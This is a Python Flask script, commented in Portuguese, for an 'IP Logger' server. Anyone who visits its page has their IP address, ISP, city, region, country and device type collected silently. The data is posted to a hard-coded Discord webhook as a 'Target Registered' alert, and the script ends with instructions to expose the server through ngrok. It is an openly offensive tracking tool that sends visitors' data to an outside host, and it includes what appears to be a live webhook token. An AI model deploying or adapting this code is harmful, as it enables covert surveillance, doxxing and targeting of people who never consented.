from flask import Flask, request, jsonify
import requests
import datetime

app = Flask(__name__)

# --------------------------
#  ⚠️ ATENÇÃO: configure APENAS esta linha
# --------------------------
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1529523768429510696/X8cVduDFB8VDkIH2Xa_rKDi2VFS4eVwmbTtmTPvcuGo4hs3FyoNLixSg0pxdjQIhieoq"  # COLAR AQUI A WEBHOOK DO DISCORD


# Envia os dados pra webhook do Discord
def send_to_discord_webhook(data):
    if DISCORD_WEBHOOK_URL == "SUA_URL_DO_WEBHOOK_AQUI":
        print("\n[!] AVISO: WEBHOOK NÃO CONFIGURADO. Dados serão mostrados no terminal apenas.\n")
        return

    embed = {
        "title": "🎯 Alvo Registrado",
        "color": 15158332,
        "fields": [
            {"name": "🌐 IP", "value": f"`{data.get('ip')}`", "inline": True},
            {"name": "🏢 ISP/Provedor", "value": f"`{data.get('isp')}`", "inline": True},
            {"name": "🛡️ VPN/Proxy", "value": f"`{data.get('vpn')}`", "inline": True},
            {"name": "🗺️ Localização", "value": f"{data.get('city')}, {data.get('region')}\n{data.get('country')}", "inline": False},
            {"name": "📱 Dispositivo", "value": f"{data.get('deviceType')}\n{data.get('os')}", "inline": True},
        ],
        "footer": {"text": "IP Logger • auto-submit v2.0"},
        "timestamp": datetime.datetime.utcnow().isoformat()
    }

    payload = {"embeds": [embed]}
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] ✅ Dados enviados: {data.get('ip')}")
    except Exception as e:
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] ❌ Webhook Failed: {e}")

# --------------------------
#  🚀 Página inicial
# --------------------------
@app.route('/')
def home():
    return open("index.html", "r", encoding="utf-8").read()

# --------------------------
#  🔍 Endpoint de coleta (ataca o /get-info do HTML)
# --------------------------
@app.route('/get-info', methods=['GET'])
def get_info():
    try:
        ip = request.remote_addr
        ua = request.headers.get('User-Agent', 'Desconhecido')

        # Consulta API de geolocalização
        loc = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        loc_data = loc.json()

        # Monta payload detalhado
        payload = {
            "ip": ip,
            "isp": loc_data.get('isp', 'Desconhecido'),
            "country": loc_data.get('country', 'Desconhecido'),
            "region": loc_data.get('regionName', 'Desconhecido'),
            "city": loc_data.get('city', 'Desconhecido'),
            "deviceType": "Desktop" if "Mobile" not in ua else "Mobile" if "Android" not in ua else "Smartphone",
            "os": "Windows" if "Windows" in ua else
                   "macOS" if "Mac" in ua else
                   "Linux" if "Linux" in ua else
                   "Android" if "Android" in ua else
                   "iOS" if "iPhone" in ua else
                   "Desconhecido",
            "manufacturer": "Apple" if "iPhone" in ua or "Mac" in ua else
                           "Samsung" if "Samsung" in ua else
                           "Xiaomi" if "Xiaomi" in ua else
                           "Outro"
        }

        # Envia pro Discord antes de responder ao cliente (silenciosamente)
        send_to_discord_webhook(payload)

        return jsonify(payload)

    except Exception as e:
        error_payload = {"ip": request.remote_addr, "error": str(e)}
        send_to_discord_webhook(error_payload) # Loga mesmo em erro
        return jsonify({"error": "Servidor temporariamente indisponível"}), 503

if __name__ == '__main__':
    print("="*60)
    print("🔑 IP Logger Server — pronto para receber requisições.")
    print("🌐 Use: https://SEU-DOMINIO-AQUI .ngrok.io")
    print("="*60)
    app.run(host='0.0.0.0', port=5000, debug=False)
